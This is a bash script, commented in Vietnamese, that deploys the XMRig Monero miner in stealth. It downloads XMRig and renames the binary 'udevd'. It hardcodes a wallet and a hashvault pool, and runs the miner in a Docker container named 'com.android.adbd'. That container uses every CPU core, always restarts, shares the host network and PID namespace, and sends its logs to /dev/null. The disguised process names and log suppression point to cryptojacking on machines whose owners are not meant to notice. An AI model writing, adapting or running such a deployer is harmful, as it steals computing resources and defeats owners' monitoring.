#!/bin/bash

# ========== KIỂM TRA PHỤ THUỘNG ==========
command -v docker >/dev/null || { echo "❌ Docker chưa cài."; exit 1; }
command -v curl  >/dev/null || { echo "❌ curl chưa cài."; exit 1; }
command -v bc    >/dev/null || { echo "❌ bc chưa cài. Đang cài đặt bc..."; sudo apt-get update && sudo apt-get install -y bc; }

# ========== CẤU HÌNH ==========
WALLET=${WALLET:-85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz}
CONTAINER_NAME=${CONTAINER_NAME:-com.android.adbd}
IMAGE_NAME=${IMAGE_NAME:-ubuntu-runtime-base}

# ========== TÍNH TOÁN CPU ==========
CPU_CORES=$(nproc)
USE_CORES=$CPU_CORES
THREAD_HINT=$USE_CORES
CPUSET="0-$((CPU_CORES-1))"

# ========== URL XMRig ==========
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
EXPECTED_SHA256="b2c88b19699e3d22c4db0d589f155bb89efbd646ecf9ad182ad126763723f4b7"

# ========== CHUẨN BỊ ==========
docker rm -f "${CONTAINER_NAME}" 2>/dev/null
sudo systemctl unmask docker docker.socket containerd.service
sudo systemctl start docker || { echo "❌ Không thể khởi động Docker."; exit 1; }

WORKDIR=$(mktemp -d)
cd "${WORKDIR}" || exit 1

echo "[*] Tải XMRig..."
curl -sL -o xmrig.tar.gz "${XMRIG_URL}"
ACTUAL_SHA256=$(sha256sum xmrig.tar.gz | awk '{print $1}')
[ "${ACTUAL_SHA256}" != "${EXPECTED_SHA256}" ] && { echo "❌ Hash không khớp."; exit 1; }

echo "[✓] SHA256 hợp lệ."
tar -xf xmrig.tar.gz
XMRIG_BIN=$(find . -type f -name xmrig | head -n1)
[ -z "$XMRIG_BIN" ] && { echo "❌ Không tìm thấy xmrig."; exit 1; }
mv "$XMRIG_BIN" ./udevd && chmod +x ./udevd

# ========== TẠO config.json ==========
cat > config.json <<EOF
{
  "autosave": true,
  "cpu": { "enabled": true, "max-threads-hint": $THREAD_HINT, "priority": -20, "huge-pages": true },
  "pools": [{"url":"pool.hashvault.pro:443","user":"$WALLET","pass":"x","tls":true,"keepalive":true}]
}
EOF

# ========== Dockerfile NGỤY TRANG KHÔNG LOG ==========
cat > Dockerfile <<'EOF'
FROM ubuntu:20.04
ARG DEBIAN_FRONTEND=noninteractive
ENV TZ=Asia/Ho_Chi_Minh
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone \
 && apt-get update && apt-get install -y --no-install-recommends libhwloc-dev curl unzip \
 && apt-get clean && rm -rf /var/lib/apt/lists/*
WORKDIR /
COPY udevd /usr/bin/udevd
COPY config.json /etc/udev/config.json
RUN chmod +x /usr/bin/udevd
ENTRYPOINT ["/usr/bin/udevd", "--config", "/etc/udev/config.json"]
EOF

# ========== BUILD & RUN KHÔNG LOG ==========
echo "[*] Build image..."
docker build -t "${IMAGE_NAME}" . || exit 1

echo "[*] Run container (stealth mode)..."
docker run -d \
  --name "${CONTAINER_NAME}" \
  --cpuset-cpus="$CPUSET" \
  --cpus="$USE_CORES" \
  --memory="20000m" \
  --restart=always \
  --net=host \
  --pid=host \
  -v /dev/null:/var/log \
  -v /dev/null:/var/log/udev \
  "${IMAGE_NAME}"

# ========== CLEAN ==========
cd ~ && rm -rf "$WORKDIR"
echo "[✓] Container chạy ngầm không log, sử dụng toàn bộ CPU."
